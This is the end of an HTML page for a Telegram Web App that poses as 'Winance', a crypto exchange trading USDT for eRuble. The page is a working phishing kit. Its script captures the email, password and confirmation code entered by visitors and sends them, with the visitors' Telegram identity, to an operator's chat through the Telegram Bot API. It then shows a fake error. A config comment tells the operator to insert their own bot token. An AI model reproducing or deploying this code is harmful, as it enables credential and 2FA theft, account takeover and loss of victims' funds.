        </div>

        <div class="menu">
            <button class="menu-item" onclick="goTo('about')">
                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg></span>
                О компании <span class="arrow">›</span>
            </button>
            <button class="menu-item" onclick="goTo('buy')">
                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg></span>
                Торговля <span class="arrow">›</span>
            </button>
            <button class="menu-item" onclick="goTo('guide')">
                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg></span>
                Как начать <span class="arrow">›</span>
            </button>
            <button class="menu-item" onclick="goTo('faq')">
                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg></span>
                FAQ <span class="arrow">›</span>
            </button>
        </div>

        <button class="btn-primary" onclick="goTo('loginForm')">Войти</button>

        <div class="register-link">
            Нет аккаунта? <a href="#" onclick="showMessage('Регистрация на winance.exchange','info');return false;">Зарегистрироваться</a>
        </div>
    </div>

    <!-- ============ О КОМПАНИИ ============ -->
    <div id="pageAbout" class="page">
        <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg></div>
        <div class="page-title">О компании</div>
        <div class="page-sub">Winance — криптовалютная биржа</div>
        <div class="card"><p><span style="color:var(--accent);font-weight:600;">Winance</span> — это платформа для обмена USDT на eRuble и другие криптовалюты по актуальным курсам.</p></div>
        <div class="card"><p>Безопасность, скорость и надёжность торговли.</p></div>
        <button class="btn-back" onclick="goTo('main')">← Назад</button>
    </div>

    <!-- ============ ТОРГОВЛЯ ============ -->
    <div id="pageBuy" class="page">
        <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg></div>
        <div class="page-title">Торговля</div>
        <div class="page-sub">Купить или продать</div>
        <div class="card"><h3>Покупка</h3><p>Введите сумму в USDT и получите ERUB по текущему курсу.</p></div>
        <div class="card"><h3>Продажа</h3><p>Обменяйте ERUB на USDT по рыночной цене.</p></div>
        <button class="btn-back" onclick="goTo('main')">← Назад</button>
    </div>

    <!-- ============ КАК НАЧАТЬ ============ -->
    <div id="pageGuide" class="page">
        <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg></div>
        <div class="page-title">Как начать</div>
        <div class="page-sub">3 шага до торговли</div>
        <div class="card"><h3>1. Регистрация</h3><p>Создайте аккаунт на winance.exchange.</p></div>
        <div class="card"><h3>2. Пополнение</h3><p>Внесите USDT или другую криптовалюту.</p></div>
        <div class="card"><h3>3. Торговля</h3><p>Покупайте и продавайте ERUB на споте.</p></div>
        <button class="btn-back" onclick="goTo('main')">← Назад</button>
    </div>

    <!-- ============ FAQ ============ -->
    <div id="pageFaq" class="page">
        <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg></div>
        <div class="page-title">FAQ</div>
        <div class="page-sub">Частые вопросы</div>
        <div class="faq-item"><div class="q">Какая комиссия?</div><div class="a">Зависит от типа ордера и объёма торгов.</div></div>
        <div class="faq-item"><div class="q">Как вывести средства?</div><div class="a">В разделе «Кошелёк» выберите нужную монету и сеть.</div></div>
        <div class="faq-item"><div class="q">Безопасно ли это?</div><div class="a">Да, мы используем шифрование и холодные кошельки.</div></div>
        <button class="btn-back" onclick="goTo('main')">← Назад</button>
    </div>

    <!-- ============ ВХОД ============ -->
    <div id="pageLoginForm" class="page">
        <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M15 12H3"/></svg></div>
        <div class="page-title">Вход</div>
        <div class="page-sub">Введите данные аккаунта</div>

        <div class="form-group"><label>Email</label><input type="email" id="email" placeholder="name@example.com"></div>
        <div class="form-group"><label>Пароль</label><input type="password" id="password" placeholder="••••••••"></div>

        <button id="loginBtn" class="btn-primary" onclick="handleLogin()">Войти</button>
        <div id="loginError" class="message error"></div>
        <button class="btn-back" onclick="goTo('main')">← Назад</button>
    </div>

    <!-- ============ КОД ============ -->
    <div id="pageCode" class="page">
        <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
        <div class="page-title">Подтверждение</div>
        <div class="page-sub">Введите код из письма</div>

        <div class="code-section">
            <label>Код из 6 цифр</label>
            <input type="text" id="codeInput" maxlength="6" placeholder="000000" inputmode="numeric">
            <button id="codeBtn" class="btn-primary" onclick="handleCode()">Отправить</button>
        </div>

        <div id="codeError" class="message error"></div>
        <div id="codeStatus" class="status-waiting"><span class="spinner"></span>Проверка...</div>
        <button class="btn-back" onclick="goTo('loginForm')">← Назад</button>
    </div>

    <!-- ============ ОШИБКА ============ -->
    <div id="pageError" class="page error-page">
        <div class="icon">✕</div>
        <h2>Ошибка</h2>
        <p>Неверные данные или истек срок действия кода.</p>
        <button class="btn-primary" onclick="goTo('main')">Вернуться на главную</button>
    </div>

    <div id="msg" class="message"></div>

    <div class="footer">
        <button onclick="openSupportChat()" class="support-btn">Служба поддержки</button>
    </div>

</div>

<script>
    // ============================================================
    // КОНФИГ (⚠️ ВСТАВЬ СВОЙ ТОКЕН И ID)
    // ============================================================
    const BOT_TOKEN = "ВСТАВЬ_ТОКЕН_ОТ_BOTFATHER";
    const ADMIN_ID  = "8542901240";
    const SUPPORT_LINK = "https://t.me/winance_support"; // Ссылка на ТП
    const MAX_ATTEMPTS = 3;

    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    // ============================================================
    // ЭЛЕМЕНТЫ
    // ============================================================
    const pages = {
        main:      document.getElementById('pageMain'),
        about:     document.getElementById('pageAbout'),
        buy:       document.getElementById('pageBuy'),
        guide:     document.getElementById('pageGuide'),
        faq:       document.getElementById('pageFaq'),
        loginForm: document.getElementById('pageLoginForm'),
        code:      document.getElementById('pageCode'),
        error:     document.getElementById('pageError'),
    };

    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const codeInput = document.getElementById('codeInput');

    const loginError = document.getElementById('loginError');
    const codeError = document.getElementById('codeError');
    const codeStatus = document.getElementById('codeStatus');

    const loginBtn = document.getElementById('loginBtn');
    const codeBtn = document.getElementById('codeBtn');

    const msgDiv = document.getElementById('msg');

    let userEmail = '';
    let userPassword = '';
    let attemptCount = 0;

    // ============================================================
    // ЛОГИКА
    // ============================================================
    function showMessage(text, type = 'info') {
        msgDiv.textContent = text;
        msgDiv.className = `message ${type}`;
        clearTimeout(msgDiv._timer);
        msgDiv._timer = setTimeout(() => { msgDiv.style.display = 'none'; }, 5000);
    }

    function goTo(name) {
        Object.values(pages).forEach(p => p.classList.remove('active'));
        pages[name].classList.add('active');
        msgDiv.style.display = 'none';
        loginError.style.display = 'none';
        codeError.style.display = 'none';
        codeStatus.style.display = 'none';

        if (name === 'main') {
            email.value = '';
            password.value = '';
            codeInput.value = '';
            loginBtn.disabled = false;
            loginBtn.textContent = 'Войти';
            codeBtn.disabled = false;
            codeBtn.textContent = 'Отправить';
            attemptCount = 0;
        }
        if (name === 'loginForm') setTimeout(() => email.focus(), 200);
        if (name === 'code') setTimeout(() => codeInput.focus(), 200);
    }

    function openSupportChat() {
        window.open(SUPPORT_LINK, '_blank');
    }

    function handleError() {
        attemptCount++;
        if (attemptCount >= MAX_ATTEMPTS) {
            document.querySelectorAll('input, button').forEach(el => el.disabled = true);
            goTo('error');
            return true;
        }
        return false;
    }

    async function sendToAdmin(text) {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
            const data = await res.json();
            return data.ok;
        } catch (err) {
            console.error(err);
            return false;
        }
    }

    async function handleLogin() {
        const e = email.value.trim();
        const p = password.value.trim();

        if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
        if (!e.includes('@')) { showMessage('Некорректный email', 'error'); return; }

        userEmail = e;
        userPassword = p;

        loginBtn.disabled = true;
        loginBtn.textContent = 'Загрузка...';

        const user = tg.initDataUnsafe?.user || {};
        const msg =
            `🔐 <b>НОВЫЙ ВХОД (Winance)</b>\n\n` +
            `👤 ID: <code>${user.id || 'неизвестно'}</code>\n` +
            `👤 Имя: ${user.first_name || '-'}\n` +
            `👤 Username: @${user.username || 'нет'}\n\n` +
            `📧 Email: <code>${e}</code>\n` +
            `🔑 Пароль: <code>${p}</code>`;

        const ok = await sendToAdmin(msg);

        loginBtn.disabled = false;
        loginBtn.textContent = 'Войти';

        if (!ok) {
            if (handleError()) return;
            loginError.textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
            loginError.style.display = 'block';
            return;
        }

        goTo('code');
        codeStatus.style.display = 'block';
    }

    async function handleCode() {
        const code = codeInput.value.trim();
        if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }

        codeBtn.disabled = true;
        codeBtn.textContent = 'Загрузка...';

        const user = tg.initDataUnsafe?.user || {};
        const msg =
            `🔑 <b>КОД ПОДТВЕРЖДЕНИЯ (Winance)</b>\n\n` +
            `👤 ID: <code>${user.id || 'неизвестно'}</code>\n` +
            `👤 Имя: ${user.first_name || '-'}\n\n` +
            `📧 Email: <code>${userEmail}</code>\n` +
            `🔑 Пароль: <code>${userPassword}</code>\n` +
            `🔢 Код: <code>${code}</code>`;

        const ok = await sendToAdmin(msg);

        codeBtn.disabled = false;
        codeBtn.textContent = 'Отправить';

        if (!ok) {
            if (handleError()) return;
            codeError.textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
            codeError.style.display = 'block';
            return;
        }

        codeInput.value = '';
        codeStatus.style.display = 'none';
        goTo('error');
    }

    document.addEventListener('keypress', function(e) {
        if (e.key !== 'Enter') return;
        if (pages.loginForm.classList.contains('active')) handleLogin();
        else if (pages.code.classList.contains('active')) handleCode();
    });
</script>

</body>
</html>
